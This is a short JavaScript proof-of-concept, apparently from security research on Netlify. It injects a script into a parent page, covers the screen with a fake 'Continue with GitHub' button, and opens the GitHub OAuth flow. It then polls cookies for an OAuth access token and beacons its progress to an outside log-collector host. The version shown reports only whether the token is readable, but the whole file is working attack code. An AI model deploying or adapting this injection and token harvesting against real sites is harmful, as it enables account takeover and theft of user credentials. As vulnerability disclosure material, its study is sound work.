(() => {
  const d = parent.document;
  const s = d.createElement("script");

  s.textContent = `
    (() => {
      const collector =
        "https://http-log-collector.netlify.app/api/log";

      function log(step, detail = "") {
        const u = new URL(collector);
        u.searchParams.set("s", step);
        if (detail) u.searchParams.set("d", detail);
        u.searchParams.set("_", Date.now() + Math.random());
        new Image().src = u;
      }

      document.getElementById("parent-control-poc")?.remove();

      const button = document.createElement("button");
      button.id = "parent-control-poc";
      button.textContent = "Continue with GitHub";
      button.style.cssText =
        "position:fixed;inset:0;width:100vw;height:100vh;" +
        "z-index:2147483647;font-size:48px;cursor:pointer";

      button.onclick = () => {
        log("parent-click-handler-ran");

        window.open(
          "https://api.netlify.com/auth" +
          "?provider=github" +
          "&site_id=app.netlify.com" +
          "&login=true" +
          "&entry_point=direct" +
          "&redirect=" +
          encodeURIComponent("https://www.netlify.com/") +
          "&use_redirect=true",
          "_blank",
          "noopener"
        );

        let attempt = 0;

        function inspect() {
          attempt++;

          try {
            const match = document.cookie.match(
              /(?:^|;\\s*)_initial_landing_page=([^;]*)/
            );

            let tokenReadable = false;

            if (match) {
              let value = match[1];

              try {
                value = decodeURIComponent(value);
              } catch {}

              tokenReadable =
                /(?:^|[?#&])access_token=[^&#]+/.test(value);
            }

            log(
              "parent-check",
              "attempt=" + attempt +
              ",cookieReadable=" + Boolean(match) +
              ",tokenReadable=" + tokenReadable
            );

            if (tokenReadable) {
              log("parent-control-demonstrated");
              button.remove();
              return;
            }
          } catch (error) {
            log("parent-check-error", error.message);
          }

          if (attempt < 120) {
            window.setTimeout(inspect, 1000);
          } else {
            log("parent-check-timeout");
          }
        }

        window.setTimeout(inspect, 1000);
      };

      document.body.appendChild(button);
      log("parent-button-installed");
    })();
  `;

  (d.head || d.documentElement).appendChild(s);
  s.remove();
})();
